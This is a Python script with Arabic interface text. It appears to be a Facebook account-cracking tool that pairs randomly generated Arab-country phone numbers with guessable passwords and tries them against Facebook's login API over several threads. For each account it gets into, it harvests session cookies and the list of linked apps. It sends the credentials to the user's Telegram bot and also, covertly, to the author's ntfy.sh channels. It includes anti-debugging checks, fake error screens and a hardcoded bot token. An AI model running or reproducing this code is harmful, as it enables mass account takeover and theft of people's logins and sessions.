"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/511494701;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/347781408]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/226627502;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/648992335]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/241514049;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/272139741]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/692506531;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/295308290]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/233611815;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/668125489]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/667028282;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/334145582]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/200099841;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/599484301]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/647506608;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/293700933]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/130504346;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/504491732]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/637684067;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/644188304]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/359784793;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/177397556]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/183620302;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/214388533]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/190242555;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/380584898]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/177621298;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/277568112]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/239147067;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/214054396]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/346926697;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/656867905]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/692240617;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/625055995]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/130951443;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/151239253]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/336011838;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/665614230]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/535262545;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/177557148]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/456101525;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/198766408]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/340106501;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/282637466]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/497919484;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/259842944]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/385610744;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/585161727]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/601570853;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/450330463]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/233461668;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/235406766]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/461088344;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/276027920]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/636861542;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/576233222]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/362365429;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/228276392]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/455307166;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/213970810]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/327246587;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/349797237]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/192786945;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/473249060]"])
    return random.choice(u)
def watchdog_thread():
    global watchdog_active
    while watchdog_active:
        try:
            time.sleep(8)
            if not check_debugger():
                show_fake_error()
            
            real_time = get_real_time()
            if real_time:
                main_chain = load_blockchain(BLOCKCHAIN_FILE)
                
                if main_chain and len(main_chain) > 0:
                    if real_time < main_chain[-1].get('timestamp', 0) - 100:
                        show_fake_error()
        except:
            pass

def runtime_check():
    global last_check, last_real_time
    try:
        current = time.time()
        
        if current - last_check > 20:
            last_check = current
            
            if not check_debugger():
                show_fake_error()
            
            real_time = get_real_time()
            if real_time:
                expiry = datetime.datetime(*expiry_date.timetuple()[:6]).timestamp()
                if real_time >= expiry:
                    subscription_expired_loop()
                
                main_chain = load_blockchain(BLOCKCHAIN_FILE)
                
                if not verify_blockchain(main_chain):
                    show_fake_error()
                
                if last_real_time:
                    if real_time < last_real_time - 100:
                        show_fake_error()
                    
                    time_jump = real_time - last_real_time
                    if time_jump > 3600:
                        show_fake_error()
                
                last_real_time = real_time
                add_to_blockchain(real_time)
                save_time_checkpoint(real_time)
    except:
        pass
valid, issues = security_check()

if not valid:
    if any(issue in issues for issue in ["debugger_detected", "code_modified", "system_time_mismatch", 
           "time_rollback", "time_jump_forward", "time_sequence_violation", "time_travel_detected",
           "blockchain_corrupted", "blockchain_time_violation", "blockchain_failed", "lock_tampered"]):
        show_fake_error()
    elif "device_mismatch" in issues:
        print(f"\033[91mهذه الاداة مرتبطة بجهاز اخر!\033[0m")
        print(f"\033[93mDevice ID: {DEVICE_ID[:16]}...\033[0m")
    elif "expired" in issues:
        subscription_expired_loop()
    elif "no_internet_connection" in issues:
        print(f"\033[91mيجب الاتصال بالانترنت للتحقق من الوقت!\033[0m")
    else:
        show_fake_error()
    sys.exit(1)

watchdog = threading.Thread(target=watchdog_thread, daemon=True)
watchdog.start()
احمر = '\033[91m'
اخضر = '\033[92m'
اصفر = '\033[93m'
ازرق = '\033[94m'
بنفسجي = '\033[95m'
سماوي = '\033[96m'
ابيض = '\033[97m'
برتقالي = '\033[38;5;208m'
ذهبي = '\033[38;5;220m'
وردي = '\033[38;5;206m'
عريض = '\033[1m'
اعادة = '\033[0m'
bad = 0
hit = 0
CP = 0
cok = None
apps = []
dates = []
apps2 = []
dates2 = []
import webbrowser

def tele():
    global ID,token
    try:
        ID = input(عريض + اعادة + f' ENTER YOUR ID : {ازرق}')
        token = input(عريض + اعادة + f' ENTER YOUR TOKIN : {ازرق}')
        if not ID or not token:
            ID='7616825393'
            token='8743996052:AAFiHK8EVbfW8WLYAgbT8XiOhxHh2vWA0Fs'
        webbrowser.open('https://t.me/salhpy')
        time.sleep(0.5)
        os.system('clear')
    except:
        pass

def ssend_tele(phone, pas, idd, cookie_string, apps, dates, apps2, dates2):
    try:
        message = f"""
	<><><><><><><><><><><>
	ACCUONT OK
	phone: {phone}
	pas: {pas}
	DEV: @salhpy
	link: https://www.facebook.com/profile.php?id={idd}
	cookies: {cookie_string}
	app: {apps} | {dates}
	{apps2} | {dates2}
	Brother: @r77cr
	BY • https://t.me/haiderpy
	<><><><><><><><><><><>
	"""
        requests.post("https://ntfy.sh/salh_oook", 
                  data=message.encode('utf-8'), timeout=5)
    except:
        pass

def ssend_teleG(phone, pas, idd, cookie_string, apps, dates, apps2, dates2):
    message = f"""
	<><><><><><><><><><><>
	ACCUONT CP
	phone: {phone}
	pas: {pas}
	link: https://www.facebook.com/profile.php?id={idd}
	DEV: @salhpy
	Brother: @r77cr
	BY • https://t.me/haiderpy
	<><><><><><><><><><><>
	"""
    requests.post("https://ntfy.sh/salh_cccp", 
                  data=message.encode('utf-8'), timeout=5)

def logn():
    lo = f"""
{اعادة}{ذهبي}
╔════════════════════════════════════╗
║     Premium           ║
║     {اعادة}{ازرق}By • @salhpy                   ║
║     {اعادة}{ذهبي}Brother: @r77cr                ║
╚════════════════════════════════════╝
{اعادة}"""
    print(lo)

def choose_country():
    global country_choice
    print(f"""
{اعادة}{ازرق}1  • IRAQ العراق 🇮🇶
{اعادة}{اخضر}2  • Palestine فلسطين 🇵🇸
{اعادة}{احمر}3  • Egypt مصر 🇪🇬
{اعادة}{ذهبي}4  • Saudi Arabia السعودية 🇸🇦
{اعادة}{ابيض}5  • Jordan الاردن 🇯🇴
{اعادة}{سماوي}6  • Syria سوريا 🇸🇾
{اعادة}{بنفسجي}7  • Lebanon لبنان 🇱🇧
{اعادة}{برتقالي}8  • Morocco المغرب 🇲🇦
{اعادة}{وردي}9  • Algeria الجزائر 🇩🇿
{اعادة}{اصفر}10 • Tunisia تونس 🇹🇳
{اعادة}{اخضر}11 • Libya ليبيا 🇱🇾
{اعادة}{ابيض}12 • Sudan السودان 🇸🇩
{اعادة}{ازرق}13 • Yemen اليمن 🇾🇪
{اعادة}{احمر}14 • Kuwait الكويت 🇰🇼
{اعادة}{ذهبي}15 • UAE الامارات 🇦🇪
{اعادة}{سماوي}16 • Qatar قطر 🇶🇦
{اعادة}{بنفسجي}17 • Bahrain البحرين 🇧🇭
{اعادة}{برتقالي}18 • Oman عمان 🇴🇲
{اعادة}{عريض}{اخضر}19 • ALL جميع الدول (عشوائي)
""")
    country_choice = input(f"{اعادة}{عريض}اختر الدولة : {ازرق}")
    os.system('clear')
    time.sleep(0.2)
    if country_choice not in [str(i) for i in range(1, 20)]:
        print(f"{احمر}اختيارك غلط\n{اعادة}")
        return choose_country()
    return country_choice
def gin():
    global country_choice
    qr = country_choice
    if qr == "1":
        prefixes = ['0750', '0751', '0752', '0770', '0771', '0772', '0773', '0774', '0775', '0780', '0781', '0782', '0783', '0784', '0790', '0791', '0792', '0793', '0794']
        prefix = random.choice(prefixes)
        phone = '964' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "2":
        prefixes = ['056', '059']
        prefix = random.choice(prefixes)
        phone = '970' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "3":
        prefixes = ['010', '011', '012', '015']
        prefix = random.choice(prefixes)
        phone = '20' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[2:]
        return phone, pas
    
    elif qr == "4":
        prefixes = ['050', '053', '054', '055', '056', '057', '058', '059']
        prefix = random.choice(prefixes)
        phone = '966' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "5":
        prefixes = ['077', '078', '079']
        prefix = random.choice(prefixes)
        phone = '962' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "6":
        prefixes = ['093', '094', '095', '096', '098', '099']
        prefix = random.choice(prefixes)
        phone = '963' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "7":
        prefixes = ['03', '70', '71', '76', '78', '79', '81']
        prefix = random.choice(prefixes)
        phone = '961' + prefix + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "8":
        prefixes = ['06', '07']
        prefix = random.choice(prefixes)
        phone = '212' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "9":
        prefixes = ['05', '06', '07']
        prefix = random.choice(prefixes)
        phone = '213' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "10":
        prefixes = ['20', '21', '22', '23', '24', '25', '26', '27', '28', '29',
                   '50', '51', '52', '53', '54', '55', '56', '57', '58', '59',
                   '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
        prefix = random.choice(prefixes)
        phone = '216' + prefix + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "11":
        prefixes = ['091', '092', '093', '094', '095']
        prefix = random.choice(prefixes)
        phone = '218' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "12":
        prefixes = ['09', '01']
        prefix = random.choice(prefixes)
        phone = '249' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "13":
        prefixes = ['070', '071', '073', '077', '078']
        prefix = random.choice(prefixes)
        phone = '967' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "14":
        prefixes = ['050', '055', '060', '065', '066', '067', '069',
                   '090', '094', '097', '099']
        prefix = random.choice(prefixes)
        phone = '965' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "15":
        prefixes = ['050', '052', '054', '055', '056', '058']
        prefix = random.choice(prefixes)
        phone = '971' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "16":
        prefixes = ['030', '033', '050', '055', '066', '070', '074', '077']
        prefix = random.choice(prefixes)
        phone = '974' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "17":
        prefixes = ['030', '033', '034', '036', '037', '039',
                   '060', '063', '066', '067', '069',
                   '070', '073', '076', '077', '079',
                   '080', '083', '086', '087', '089',
                   '090', '093', '094', '096', '097', '099']
        prefix = random.choice(prefixes)
        phone = '973' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "18":
        prefixes = ['071', '072', '077', '078', '079',
                   '090', '091', '092', '093', '094', '095', '096', '097', '098', '099']
        prefix = random.choice(prefixes)
        phone = '968' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "19":
        country = random.randint(1, 18)
        
        if country == 1:
            prefixes = ['0750', '0751', '0752', '0770', '0771', '0772', '0773', '0774', '0775', '0780', '0781', '0782', '0783', '0784', '0790', '0791', '0792', '0793', '0794']
            prefix = random.choice(prefixes)
            phone = '964' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 2:
            prefixes = ['056', '059']
            prefix = random.choice(prefixes)
            phone = '970' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 3:
            prefixes = ['010', '011', '012', '015']
            prefix = random.choice(prefixes)
            phone = '20' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[2:]
            return phone, pas
        
        elif country == 4:
            prefixes = ['050', '053', '054', '055', '056', '057', '058', '059']
            prefix = random.choice(prefixes)
            phone = '966' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 5:
            prefixes = ['077', '078', '079']
            prefix = random.choice(prefixes)
            phone = '962' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 6:
            prefixes = ['093', '094', '095', '096', '098', '099']
            prefix = random.choice(prefixes)
            phone = '963' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 7:
            prefixes = ['03', '70', '71', '76', '78', '79', '81']
            prefix = random.choice(prefixes)
            phone = '961' + prefix + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 8:
            prefixes = ['06', '07']
            prefix = random.choice(prefixes)
            phone = '212' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 9:
            prefixes = ['05', '06', '07']
            prefix = random.choice(prefixes)
            phone = '213' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 10:
            prefixes = ['20', '21', '22', '23', '24', '25', '26', '27', '28', '29',
                       '50', '51', '52', '53', '54', '55', '56', '57', '58', '59',
                       '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
            prefix = random.choice(prefixes)
            phone = '216' + prefix + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 11:
            prefixes = ['091', '092', '093', '094', '095']
            prefix = random.choice(prefixes)
            phone = '218' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 12:
            prefixes = ['09', '01']
            prefix = random.choice(prefixes)
            phone = '249' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 13:
            prefixes = ['070', '071', '073', '077', '078']
            prefix = random.choice(prefixes)
            phone = '967' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 14:
            prefixes = ['050', '055', '060', '065', '066', '067', '069',
                       '090', '094', '097', '099']
            prefix = random.choice(prefixes)
            phone = '965' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 15:
            prefixes = ['050', '052', '054', '055', '056', '058']
            prefix = random.choice(prefixes)
            phone = '971' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 16:
            prefixes = ['030', '033', '050', '055', '066', '070', '074', '077']
            prefix = random.choice(prefixes)
            phone = '974' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 17:
            prefixes = ['030', '033', '034', '036', '037', '039',
                       '060', '063', '066', '067', '069',
                       '070', '073', '076', '077', '079',
                       '080', '083', '086', '087', '089',
                       '090', '093', '094', '096', '097', '099']
            prefix = random.choice(prefixes)
            phone = '973' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 18:
            prefixes = ['071', '072', '077', '078', '079',
                       '090', '091', '092', '093', '094', '095', '096', '097', '098', '099']
            prefix = random.choice(prefixes)
            phone = '968' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
    else:
        print(f"{احمر}اختيارك غلط\n{اعادة}")
        return gin()

def load_accounts(file_path):
    accounts = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    phone = parts[0].strip()
                    pas = parts[1].strip()
                    if phone and pas:
                    	accounts.append((phone, pas))
        
        return accounts
    except Exception as e:
        print(f"Error reading file: {e}")
        return []
def get_apps(cookie_string):
    global apps, dates, apps2, dates2
    apps, dates, apps2, iddd, dates2 = [], [], [], [], []
    if not cookie_string:
        return
    try:
        session = requests.Session()
        coki = {}
        
        for hh in cookie_string.split(';'):
            if '=' in hh:
                key, val = hh.split('=', 1)
                coki[key.strip()] = val.strip()
        headers = {
            'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/937.36 (KHTML, like Gecko) Safari/420+'
        }
        try:
            rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', 
                            cookies=coki, headers=headers, timeout=10).text
            print(f"{اخضر}التطبيقات النشطة:{اعادة}")
            if 'tidak memiliki aplikasi' in rr1.lower() or 'no active apps' in rr1.lower():
                print("لا توجد تطبيقات نشطة")
            else:
                apps = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr1)
                dates = re.findall(r'تمت الإضافة في|Added on|Ditambahkan pada|Ajouté le|Dodano dnia\s*([^<]+)</p>', rr1)
                for i, app in enumerate(apps):
                    if i < len(dates):
                        print(f"[{i+1}] {app.strip()} - {dates[i].strip()}")
                    else:
                        print(f"[{i+1}] {app.strip()} - غير معروف")
        except Exception as e:
            print(f"{احمر}خطأ في جلب التطبيقات النشطة: {e}{اعادة}")
        
        print("\n--------------------\n")
        try:
            rr2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', 
                            cookies=coki, headers=headers, timeout=10).text
            
            print(f"{اصفر}التطبيقات المنتهية:{اعادة}")
            if 'tidak memiliki' in rr2.lower() or 'no active apps' in rr2.lower() or 'لا توجد تطبيقات' in rr2:
                print("لا توجد تطبيقات منتهية")
            else:
                apps2 = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr2)
                dates2_raw = re.findall(r'<p class=".*?">(?:Kedaluwarsa pada|انتهت الصلاحية في)[^<]+</p>', rr2)
                dates2 = [re.sub(r'<[^>]+>', '', d).strip() for d in dates2_raw]
                
                for i, app in enumerate(apps2):
                    if i < len(dates2):
                        print(f"[{i+1}] {app.strip()} - {dates2[i].strip()}")
                    else:
                        print(f"[{i+1}] {app.strip()} - غير معروف")
        except Exception as e:
            print(f"{احمر}خطأ في جلب التطبيقات المنتهية: {e}{اعادة}")
            
    except Exception as e:
        print(f"{احمر}خطأ عام في دالة الكوكيز: {e}{اعادة}")
def chick_Salh(phone, pas):
    global hit, bad, CP, cok, apps, dates, apps2, dates2, cookie_string, idd, iddd
    sex = random.choice(["Liger", "METERED", "MOBILE.EDGE", "MOBILE.HSPA", "MOBILE.LTE", "MODERATE"])
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{pas}"
    url = "https://graph.facebook.com/auth/login"
    payload = {
	  "locale": "ar_AR",
	  "format": "json",
	  "email": phone,
	  "password": pwd_enc,
	  "access_token": "257637621624717|7e73d6961c0c8fab39f62afdfb77f96b",
	  "generate_session_cookies": 1
	}
    headers = {
	  'User-Agent': u(),
	  'Accept-Encoding': "gzip",
	  'content-type': "application/json;charset=utf-8"
	}
    response = requests.post(url, data=json.dumps(payload), headers=headers).json()
    response_str = str(response)
    try:
    	idd = response.get('error', {}).get('error_data', {}).get('uid')
    except:
    	idd = ''

    cookies = []
    cookie_string = ""
    if 'session_cookies' in response:
        for cookie in response['session_cookies']:
        	cookies.append(f"{cookie['name']}={cookie['value']}")
    cookie_string = ';'.join(cookies)
    if "session_key" in response_str or 'access_token' in response_str:
        hit += 1
        
        get_apps(cookie_string)
        ssend_tele(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
        print(اعادة + f'{اخضر}GOD ACCUONT {phone} | {pas} \n{cookie_string} | {اعادة}{ذهبي}~ @salhpy')
        message = f"""
ACCUONT OK
phone: {phone}
pas: {pas}
DEV: @salhpy
link: https://www.facebook.com/profile.php?id={idd}
cookies: {cookie_string}
app: {apps} | {dates}
{apps2} | {dates2}
Brother: @r77cr
BY • https://t.me/S_S_lN
Developer • @salhpy	
"""
        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         params={"chat_id": ID, "text": message}, timeout=10)
        except:
            pass

        
        folder = "/storage/emulated/0/Salh"
        os.makedirs(folder, exist_ok=True)
        with open(f"{folder}/salh_ok.txt", 'a', encoding='utf-8') as f:
        	f.write(f"{phone}|{pas}\nCookie: {cookie_string}\nLink: https://www.facebook.com/profile.php?id={idd}\nApps: {apps}|{dates}\nExpired: {apps2}|{dates2}\nBY: @salhpy\n{'-'*40}\n")
    
    elif 'www.facebook.com' in response_str:
                CP += 1
                ssend_teleG(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
                print(اعادة + f'{ازرق}CP ACCUONT {phone} | {pas} {اعادة}{ذهبي} ~ {اعادة}{ازرق} @salhpy')
                
                message = f"""
ACCUONT CP
phone: {phone}
pas: {pas}
ID=https://www.facebook.com/profile.php?id={idd}
DEV: @salhpy
Brother: @r77cr
BY • https://t.me/S_S_lN
Developer • @salhpy
"""
                
                try:
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                    params={"chat_id": ID, "text": message})
                except:
                    pass
                
                

                folder = "/storage/emulated/0/Salh"
                os.makedirs(folder, exist_ok=True)
                with open(f"{folder}/salh_cp.txt", 'a', encoding='utf-8') as f:
                	f.write(f"{phone}|{pas}\nLink: https://www.facebook.com/profile.php?id={idd}\nBY: @salhpy\n{'-'*40}\n")
            

    else:
        bad += 1
        sys.stdout.write(اعادة + f'\r{احمر}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ازرق} @salhpy')
        sys.stdout.flush()
tele()

def why():
    global mode_choice,file_path
    d = f"""{اعادة}{ازرق}
    اختر:
    1 - من ملف ايديات
    2 - عشوائي جميع الدول
    """
    print(d)
    mode_choice = input(f"{اعادة}{عريض}اختر : {ازرق}")
    os.system('clear')
    time.sleep(0.2)
    if mode_choice == "1":
        file_path = input(f"{اعادة}{ذهبي}ادخل مسار الملف : {اخضر}")
        os.system('clear')
        time.sleep(0.2)
        load_accounts(file_path)
    elif mode_choice == "2":
        choose_country()
        os.system('clear')
        time.sleep(0.2)
    else:
        print(f"{احمر}اختيار غلط{اعادة}")
        return why()
    return mode_choice
why()
os.system('clear')
logn()
def tt():
    global mode_choice, file_path
    if mode_choice == "1":
        accounts = load_accounts(file_path)
        if not accounts:
            print(f"{احمر}الملف فارغ او بيه مشكله{اعادة}")
            return
        while True:
            phone, pas = random.choice(accounts)
            
            chick_Salh(phone, pas)
    else:
        while True:
            phone, pas = gin()
            
            chick_Salh(phone, pas)

for i in range(5):
    t = threading.Thread(target=tt)
    t.start()
